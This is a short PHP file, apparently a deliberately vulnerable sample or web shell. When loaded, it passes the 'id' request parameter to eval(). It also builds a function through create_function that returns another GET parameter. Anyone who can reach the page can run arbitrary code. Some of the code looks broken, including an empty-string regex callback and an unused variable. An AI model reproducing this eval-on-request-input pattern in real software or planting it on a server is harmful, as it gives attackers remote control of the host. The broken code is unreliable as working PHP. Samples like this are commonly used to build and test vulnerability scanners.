<?php

class remote 

{

	    public function eval_attack($value)
    {
       
		$matches = preg_replace_callback('/(\<\?=|\<\?php=|\<\?php)(.*?)\?\>/','', $value);
		$return_block = 'N0 Hacker';
        eval($matches);

        
    }
    
    public function create ()
    {
		$ls = create_function('$value','return $_GET[a];');
		$ls(0);
		}
    
     

}

$rem = new remote();
$rem->eval_attack($_GET['id']);


?>
